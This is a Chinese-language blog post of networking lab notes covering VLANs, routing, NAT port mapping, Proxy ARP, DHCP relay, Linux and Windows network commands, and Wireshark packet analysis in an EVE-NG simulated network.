<h4 id="1-配置vlan"><a href="#1-配置vlan" class="headerlink" title="1.配置vlan"></a>1.配置vlan</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vlan：虚拟局域网，隔离广播，隔离故障</span><br><span class="line">vlan接口类型：</span><br><span class="line">	1.Access 接口主要用于连接终端设备，如计算机、打印机等。它属于某个特定的 VLAN，并且只能属于一个 VLAN </span><br><span class="line">	2.Trunk 接口主要用于交换机之间、交换机与路由器或三层交换机之间的互联链路。它可以允许多个 VLAN 的数据通过，从而实现不同交换机上相同 VLAN 之间的通信</span><br><span class="line">	3.Hybrid 接口是一种比较灵活的接口类型，既可以连接终端设备，也可以用于交换机之间的互联 。它可以允许多个 VLAN 的数据通过，并且可以灵活地设置哪些 VLAN 的数据在转发时携带标签，哪些不携带标签</span><br><span class="line">	</span><br><span class="line">	</span><br></pre></td></tr></table></figure>


<p>配置vlan:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_28.png" class="" title="在这里插入图片描述">


<p>查看vlan方式1：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_29.png" class="" title="在这里插入图片描述">

<p>查看vlan方式2:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_30.png" class="" title="在这里插入图片描述">

<p><strong>特别注意</strong>：在用户视图中使用save保存配置</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_31.png" class="" title="在这里插入图片描述">

<hr>
<h4 id="2-配置vlan接口"><a href="#2-配置vlan接口" class="headerlink" title="2.配置vlan接口"></a>2.配置vlan接口</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_32.png" class="" title="在这里插入图片描述">

<p><strong>对三台vpc配置静态ip与网关后测试联通：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_33.png" class="" title="在这里插入图片描述">


<p><strong>但是</strong>，配置CE6800-CE1的外接口的静态ip时出现问题：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_34.png" class="" title="在这里插入图片描述">

<blockquote>
<p><strong>原因：交换机的接口默认是交换模式，不可以直接配置静态ip，需要创建vlan，在vlan上配置静态ip</strong></p>
</blockquote>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_35.png" class="" title="在这里插入图片描述">

<p><strong>这里的 port link-type trunk 有个坑,下面会讲</strong></p>
<p><strong>小知识：</strong> 删除vlan前必须删除其关联的接口</p>
<hr>
<h4 id="3-配置路由"><a href="#3-配置路由" class="headerlink" title="3.配置路由"></a>3.配置路由</h4><ol>
<li>CE6800-CE1路由</li>
</ol>
<p>目标：让不同 VLAN 和外网互通</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_36.png" class="" title="在这里插入图片描述">

<blockquote>
<p>由于CE6800-CE1是三级交换机，整个大的局域网的数据包经过它在转发给路由器，整个局域网中的网络设备访问的公网地址很多，不可能都一一配置路由</p>
</blockquote>
<hr>
<ol start="2">
<li>AR1000v5路由</li>
</ol>
<p>目标：让不同 VLAN 和外网互通</p>
<ul>
<li>配置默认路由</li>
</ul>
<p><strong>正向：</strong> 指向AR1000v6 （三大运营商公司）</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_37.png" class="" title="在这里插入图片描述">


<p><strong>回程：</strong> 指向交换机CE6800-CE1</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_38.png" class="" title="在这里插入图片描述">




<ul>
<li>NAT映射</li>
</ul>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_39.png" class="" title="在这里插入图片描述">

<p><strong>误区：</strong> AR1000v4使用NAT映射不代表AR1000v4就不需要设置回程路由</p>
<hr>
<h4 id="4-启动Proxy-ARP"><a href="#4-启动Proxy-ARP" class="headerlink" title="4.启动Proxy ARP"></a>4.启动Proxy ARP</h4><ol>
<li>什么是ARP？<blockquote>
<p>ARP（Address Resolution Protocol，地址解析协议）的作用：将IP地址解析为MAC地址</p>
</blockquote>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主机A (IP: 192.168.1.10) 想要与 主机B (IP: 192.168.1.20) 通信</span><br><span class="line"></span><br><span class="line">1. 主机A查看自己的ARP缓存表</span><br><span class="line">2. 如果没有主机B的MAC地址，主机A广播发送ARP请求：</span><br><span class="line">   &quot;谁是192.168.1.20？请告诉你的MAC地址&quot;</span><br><span class="line"></span><br><span class="line">3. 局域网内所有主机都收到这个广播</span><br><span class="line">4. 主机B识别到自己的IP，单播回复：</span><br><span class="line">   &quot;我是192.168.1.20，我的MAC是xx:xx:xx:xx:xx:xx&quot;</span><br><span class="line"></span><br><span class="line">5. 主机A将这条映射记录存入ARP缓存表</span><br></pre></td></tr></table></figure>

<hr>
<ol start="2">
<li>什么是Proxy ARP<blockquote>
<p>Proxy ARP（代理ARP） 是一种网络技术，允许一台设备（通常是路由器或防火墙）代表另一台设备响应ARP请求。<br>它不是“标准ARP”，而是在特殊场景下“代答ARP”的机制。</p>
</blockquote>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">设备A（192.168.10.2）想ping 192.168.10.3					设备A直接在本地广播ARP请求，设备B（192.168.10.3）回应自己的MAC地址		❌ 不需要Proxy ARP</span><br><span class="line">设备A（192.168.10.2）想ping 192.168.20.3（不同网段）			设备A将包发给默认网关（CE6800-CE1），CE6800-CE1再转发				❌ 不需要Proxy ARP</span><br><span class="line">设备A（192.168.10.2）想ping 10.1.1.1（AR1000v5的接口IP）	CE6800-CE1需要知道AR1000v5的MAC地址，但AR1000v5默认不响应ARP请求		✅需要Proxy ARP！</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<ol start="3">
<li>启动华为设备ARP代理（AR1000v5）</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_40.png" class="" title="在这里插入图片描述">
<blockquote>
<p>ARP 表中没有 10.1.1.2 ✅正常现象 这正是VPC8 无法 ping 通 10.1.1.1 的根本原因！</p>
</blockquote>
<p>启动：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_41.png" class="" title="在这里插入图片描述">

<blockquote>
<p>没有变化，难道是没有生效？<br>Proxy ARP 是实时响应 ARP 请求，不会在 ARP 表中添加新条目</p>
</blockquote>
<p><strong>此时vpc8还是无法ping通10.1.1.1，这是为什么？</strong></p>
<blockquote>
<p>根本原因：AR1000v5 和 CE6800-CE1 之间的接口 VLAN 配置不一致，导致二层通信失败。</p>
</blockquote>
<table>
<thead>
<tr>
<th>设备</th>
<th>接口</th>
<th>当前 VLAN 配置</th>
<th>问题</th>
</tr>
</thead>
<tbody><tr>
<td>CE6800-CE1</td>
<td>GigabitEthernet1&#x2F;0&#x2F;3</td>
<td>port link-type trunk + port trunk allow-pass vlan 40</td>
<td>发送带 VLAN 40 Tag 的帧</td>
</tr>
<tr>
<td>AR1000v5</td>
<td>GigabitEthernet0&#x2F;0&#x2F;0</td>
<td>port link-type access + port default vlan 1（默认）</td>
<td>丢弃带 VLAN 40 Tag 的帧</td>
</tr>
</tbody></table>
<p>重新设置CE6800-CE1的g1&#x2F;0&#x2F;3接口类型</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_42.png" class="" title="在这里插入图片描述">

<p>成功ping通(别忘记,此时的AR1000v5的g0&#x2F;0&#x2F;0接口启动ARP代理)</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_43.png" class="" title="在这里插入图片描述">


<hr>
<ol start="4">
<li>AR1000v6路由</li>
</ol>
<ul>
<li>处理回包</li>
</ul>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_44.png" class="" title="在这里插入图片描述">

<ul>
<li>联通linux服务1</li>
</ul>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_45.png" class="" title="在这里插入图片描述">

<blockquote>
<p>在真实网络中，你不能把 8.8.8.8 当下一跳！<br>但在 EVE-NG 模拟环境 中，你可以这样配置，因为系统会自动处理回包。<br>✅ 这是模拟互联网的“作弊技巧” —— 没有它，ping 8.8.8.8 无法通！ </p>
</blockquote>
<hr>
<h4 id="5-linux网络配置"><a href="#5-linux网络配置" class="headerlink" title="5.linux网络配置"></a>5.linux网络配置</h4><ol>
<li>网卡信息分析</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">	1： -&gt; 接口序号（内核分配）</span><br><span class="line">	lo：-&gt; 接口名称</span><br><span class="line">	&lt;LOOPBACK,UP,LOWER_UP&gt; -&gt; 接口标志</span><br><span class="line">		LOOPBACK：回环接口</span><br><span class="line">		up：接口已启用</span><br><span class="line">		LOWER_UP：物理层正常（虽然回环没有物理层，但系统认为它“UP”）</span><br><span class="line">	mtu 65536 -&gt; 最大传输单元（MTU），回环接口默认很大</span><br><span class="line">	qdisc noqueue -&gt; 队列调度器类型（回环接口不需要排队）</span><br><span class="line">	state UNKNOWN → 接口状态（回环接口通常显示为 UNKNOWN）</span><br><span class="line">	group default → 接口组（默认组）</span><br><span class="line">	link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">		link/loopback → 链路类型（回环）</span><br><span class="line">		00:00:00:00:00:00 → MAC 地址（回环接口没有真实 MAC，所以是全 0）</span><br><span class="line">		brd 00:00:00:00:00:00 → 广播地址（回环没有广播）</span><br><span class="line">	inet 127.0.0.1/8 scope host lo</span><br><span class="line">		inet → IPv4 地址</span><br><span class="line">		127.0.0.1/8 → IP 地址 + 子网掩码（/8 表示 255.0.0.0）</span><br><span class="line">		scope host → 地址范围（只在本机有效）</span><br><span class="line">		lo → 所属接口名</span><br><span class="line">	valid_lft forever preferred_lft forever</span><br><span class="line">		valid_lft → 地址有效期（forever = 永久）</span><br><span class="line">		preferred_lft → 首选有效期（forever = 永久）</span><br><span class="line">	inet6 ::1/128 scope host</span><br><span class="line">		inet6 → IPv6 地址</span><br><span class="line">		::1/128 → IPv6 回环地址</span><br><span class="line">		scope host → 范围（本机）</span><br><span class="line">	valid_lft forever preferred_lft forever （同上）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2: ens3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:00:00:0b:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::250:ff:fe00:b00/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">	ens3: → 接口名称（这是你的实际网卡！）</span><br><span class="line">	&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span><br><span class="line">		BROADCAST = 支持广播</span><br><span class="line">		MULTICAST = 支持组播</span><br><span class="line">	qdisc pfifo_fast → 队列调度器（先进先出）</span><br><span class="line"></span><br><span class="line">	等等......</span><br><span class="line"></span><br><span class="line">重要：ens3网卡已经启用，但是没有inet ,即没有ipv4地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_46.png" class="" title="在这里插入图片描述">
<p>永久配置：</p>
<blockquote>
<p>nano &#x2F;etc&#x2F;network&#x2F;interfaces    （vim等）<br>重启网卡服务：systemctl restart systemd-networkd</p>
</blockquote>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_47.png" class="" title="在这里插入图片描述">
<p>ctrl+o 保存 -&gt; 回车确认 -&gt; ctrl+x 退出</p>
<hr>
<p>由于实验中的linux服务器是Slax轻量版，不会存储文件，为了方便实验的进行，使用vpc代替，如图：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_48.png" class="" title="在这里插入图片描述">

<p>测试NAT普通映射情况</p>
<ol>
<li>vpc8&lt;–&gt;vpc9</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_49.png" class="" title="在这里插入图片描述">

<ol start="2">
<li>vpc8&lt;–&gt;AR1000v5-g0&#x2F;0&#x2F;0</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_50.png" class="" title="在这里插入图片描述">




<hr>
<h4 id="6-服务器的端口映射"><a href="#6-服务器的端口映射" class="headerlink" title="6.服务器的端口映射"></a>6.服务器的端口映射</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_51.png" class="" title="在这里插入图片描述">


<ol>
<li>一一对应的NAT映射</li>
</ol>
<blockquote>
<p>nat server  global 64.1.1.2 inside 192.168.30.3  （华为设备的指令）</p>
</blockquote>
<p>nat server：这是命令关键字，用于启动配置 NAT Server 功能，用来建立公网地址和私网地址之间的映射关系，使外部网络能访问内部网络的特定服务器</p>
<p>global：是一个关键字，表明后续跟的是公网侧的相关信息。</p>
<p>inside：也是一个关键字，用于标识后面跟随的是内网侧的相关信息。</p>
<p>剩下的为公网ip 与 私网ip</p>
<hr>
<ol start="2">
<li>端口映射</li>
</ol>
<blockquote>
<p>nat server protocol { tcp | udp } global { 公网IP 公网端口 } inside { 内网IP 内网端口 }<br>nat server protocol { tcp | udp } global { current 公网端口 } inside { 内网IP 内网端口 }</p>
</blockquote>
<p>对AR1000v5:</p>
<blockquote>
<p>nat server protocol tcp global current 8080 inside 192.168.30.3 80</p>
</blockquote>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_52.png" class="" title="在这里插入图片描述">


<p>比如公司购买了一个公网ip，且公司有很多服务器设备，不可能每个服务器设备都购买一个公网ip，这样成本很高。接口绑定一个公网ip,而一个接口有多个端口，通过端口映射，实现一个公网ip就可以使外网设备访问内网的对应主机</p>
<p>8.8.8.8外网主机测试连接：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_53.png" class="" title="在这里插入图片描述">

<p>抓包验证：</p>
<ol>
<li>对AR1000v5-g0&#x2F;0&#x2F;1接口抓包</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_54.png" class="" title="在这里插入图片描述">

<ol start="2">
<li>对192.168.30.3抓包</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_55.png" class="" title="在这里插入图片描述">

<p>流量是从NAT server转发，验证成功</p>
<hr>
<h3 id="基础实验四"><a href="#基础实验四" class="headerlink" title="基础实验四"></a>基础实验四</h3><h4 id="0-windows网络配置"><a href="#0-windows网络配置" class="headerlink" title="0.windows网络配置"></a>0.windows网络配置</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.查看所有网络适配器详细信息：ipconfig /all</span><br><span class="line">2.查看路由表：route print</span><br><span class="line">3.查看网络连接状态：netstat -ano  # 显示所有 TCP/UDP 连接及进程 ID</span><br><span class="line"></span><br><span class="line">4.静态 IP 配置：</span><br><span class="line">	# 1. 查看网卡名称（需替换为实际名称，如“以太网”“WLAN”）</span><br><span class="line">	netsh interface show interface  </span><br><span class="line">	</span><br><span class="line">	# 2. 设置静态 IP + 子网掩码 + 网关</span><br><span class="line">	netsh interface ipv4 set address name=&quot;以太网&quot; source=static addr=192.168.1.100 mask=255.255.255.0 gateway=192.168.1.1 gwmetric=1  </span><br><span class="line">	</span><br><span class="line">	# 3. 切换为 DHCP 自动获取 IP</span><br><span class="line">	netsh interface ipv4 set address name=&quot;以太网&quot; source=dhcp  </span><br><span class="line"></span><br><span class="line">5.多 IP 地址绑定（同一网卡添加额外 IP）：</span><br><span class="line">	netsh interface ipv4 add address name=&quot;以太网&quot; addr=10.0.0.2 mask=255.255.255.0  </span><br><span class="line"></span><br><span class="line">6.静态 DNS 服务器设置：</span><br><span class="line">	# 首选 DNS</span><br><span class="line">	netsh interface ipv4 set dnsservers &quot;以太网&quot; static 114.114.114.114 primary  </span><br><span class="line">	</span><br><span class="line">	# 备用 DNS</span><br><span class="line">	netsh interface ipv4 add dnsservers &quot;以太网&quot; 8.8.8.8 index=2  </span><br><span class="line"></span><br><span class="line">7.切换为 DHCP 自动获取 DNS：</span><br><span class="line">	netsh interface ipv4 set dnsservers &quot;以太网&quot; source=dhcp  </span><br><span class="line"></span><br><span class="line">8.刷新 DNS 缓存：ipconfig /flushdns  </span><br><span class="line">9.查看本地 DNS 缓存：ipconfig /displaydns  </span><br><span class="line"></span><br><span class="line">10.添加静态路由（临时 / 永久）：</span><br><span class="line">	# 临时路由：访问 172.16.0.0/24 网段，通过网关 192.168.1.1</span><br><span class="line">	route add 172.16.0.0 mask 255.255.255.0 192.168.1.1 metric 5  </span><br><span class="line">	</span><br><span class="line">	# 永久路由：重启后保留（加 -p 参数）</span><br><span class="line">	route /p add 192.168.5.0 mask 255.255.255.0 10.0.0.1  </span><br><span class="line"></span><br><span class="line">11.删除路由：</span><br><span class="line">	route delete 172.16.0.0 mask 255.255.255.0  </span><br><span class="line"></span><br><span class="line">12.清除所有非核心路由：</span><br><span class="line">	route /f  </span><br><span class="line"></span><br><span class="line">13.开放指定端口（以 TCP 80 为例）：</span><br><span class="line">	netsh advfirewall firewall add rule name=&quot;允许 TCP 80 端口&quot; dir=in action=allow protocol=TCP localport=80  </span><br><span class="line"></span><br><span class="line">14.开放端口范围（如 1000-2000）：</span><br><span class="line">	netsh advfirewall firewall add rule name=&quot;允许 TCP 1000-2000&quot; dir=in action=allow protocol=TCP localport=1000-2000  </span><br><span class="line"></span><br><span class="line">15.允许程序通过防火墙（以 “notepad.exe” 为例）：</span><br><span class="line">	netsh advfirewall firewall add rule name=&quot;允许记事本联网&quot; dir=in action=allow program=&quot;C:\Windows\System32\notepad.exe&quot;  </span><br><span class="line"></span><br><span class="line">16.启用 / 禁用防火墙：</span><br><span class="line">	netsh advfirewall set allprofiles state on   # 启用</span><br><span class="line">	netsh advfirewall set allprofiles state off  # 禁用</span><br><span class="line"></span><br><span class="line">17.查看无线网卡驱动支持：</span><br><span class="line">	netsh wlan show drivers  </span><br><span class="line"></span><br><span class="line">18.创建并启动 Wi-Fi 热点：</span><br><span class="line">	# 1. 启用热点（SSID: MyHotspot，密码: 12345678）</span><br><span class="line">	netsh wlan set hostednetwork mode=allow ssid=MyHotspot key=12345678  </span><br><span class="line">	</span><br><span class="line">	# 2. 启动热点</span><br><span class="line">	netsh wlan start hostednetwork  </span><br><span class="line">	</span><br><span class="line">	# 3. 查看热点状态</span><br><span class="line">	netsh wlan show hostednetwork  </span><br><span class="line">	</span><br><span class="line">	# 4. 关闭热点</span><br><span class="line">	netsh wlan stop hostednetwork  </span><br><span class="line"></span><br><span class="line">19. 释放并续订 DHCP 地址：</span><br><span class="line">	ipconfig /release   # 释放IP</span><br><span class="line">	ipconfig /renew     # 重新获取IP	</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<hr>
<h4 id="1-dhcp接口配置"><a href="#1-dhcp接口配置" class="headerlink" title="1.dhcp接口配置"></a>1.dhcp接口配置</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_56.png" class="" title="在这里插入图片描述">



<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_57.png" class="" title="在这里插入图片描述">
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_58.png" class="" title="在这里插入图片描述">


<hr>
<h4 id="2-dhcp全局配置"><a href="#2-dhcp全局配置" class="headerlink" title="2.dhcp全局配置"></a>2.dhcp全局配置</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_59.png" class="" title="在这里插入图片描述">

<p>AR1000v 的配置指令与之前相同，只是中间加了一个交换机</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_60.png" class="" title="在这里插入图片描述">

<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_61.png" class="" title="在这里插入图片描述">


<hr>
<h4 id="3-dhcp中继配置"><a href="#3-dhcp中继配置" class="headerlink" title="3.dhcp中继配置"></a>3.dhcp中继配置</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_62.png" class="" title="在这里插入图片描述">



<blockquote>
<p>DHCP 依赖广播找服务器，但广播过不了路由器。<br>如果客户端和 DHCP 服务器在不同网段，客户端的“求 IP”广播会被路由器拦下，服务器永远收不到。<br>DHCP 中继就是路由器上的一个“信使”，它能收到客户端的广播，然后转发成单播给远端的 DHCP 服务器，让跨网段的客户端也能自动获取 IP。</p>
</blockquote>
<hr>
<h2 id="三、数据包，段，帧等分析"><a href="#三、数据包，段，帧等分析" class="headerlink" title="三、数据包，段，帧等分析"></a>三、数据包，段，帧等分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ Frame ] ———— 最外层：快递箱</span><br><span class="line">    |</span><br><span class="line">    └── [ Ethernet II ] ———— 外包装：收件人 MAC 地址、发件人 MAC 地址</span><br><span class="line">            |</span><br><span class="line">            └── [ Internet Protocol Version 4 ] ———— 中间层：IP 地址（192.168.1.10 → 8.8.8.8）</span><br><span class="line">                    |</span><br><span class="line">                    └── [ Transmission Control Protocol ] ———— 内包装：端口号（54321 → 80）</span><br><span class="line">                            |</span><br><span class="line">                            └── [ HTTP ] ———— 货物：你请求的网页内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>随便抓取一个tcp包进行分析:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_63.png" class="" title="在这里插入图片描述">

<p>物理层：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_64.png" class="" title="在这里插入图片描述">

<p>链路层：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_65.png" class="" title="在这里插入图片描述">
<blockquote>
<p>[Stream index: 0]<br>这是抓包工具（如 Wireshark）的内部标识，表示该帧属于 “流索引为 0” 的数据包流（用于工具内部对相关数据包进行分组管理，方便分析同一 “流” 的通信）。</p>
</blockquote>
<p>网络层：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_66.png" class="" title="在这里插入图片描述">
<p>传输层：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_67.png" class="" title="在这里插入图片描述">
<p>补充：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_68.png" class="" title="在这里插入图片描述">




<hr>
<h2 id="四、实验"><a href="#四、实验" class="headerlink" title="四、实验"></a>四、实验</h2><h3 id="1-网络搭建"><a href="#1-网络搭建" class="headerlink" title="1.网络搭建"></a>1.网络搭建</h3><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_69.png" class="" title="在这里插入图片描述">

<hr>
<ol>
<li>左子网：</li>
</ol>
<p>对AR1000v</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_70.png" class="" title="在这里插入图片描述">

<p><strong>win只需配置dhcp即可</strong></p>
<hr>
<ol start="2">
<li>右子网：</li>
</ol>
<p>对于AR1000v</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_71.png" class="" title="在这里插入图片描述">


<p>对winserver</p>
<p>配置静态ip:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_72.png" class="" title="在这里插入图片描述">

<p>安装DNS与IIS：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_73.png" class="" title="在这里插入图片描述">

<p>对DNS进行配置：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_74.png" class="" title="在这里插入图片描述">

<hr>
<h3 id="2-实验引入"><a href="#2-实验引入" class="headerlink" title="2.实验引入"></a>2.实验引入</h3><p>没有进行任何操作对win进行抓包：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_75.png" class="" title="在这里插入图片描述">

<p><strong>win主机向发送大量数据包，这是为什么？</strong></p>
<blockquote>
<p>Win (1) 节点是一个完整的 Windows 操作系统。当它启动并联网后，操作系统内部的许多服务和进程会自动开始工作，它们会发送各种网络请求，即使没有手动打开浏览器或执行命令。</p>
</blockquote>
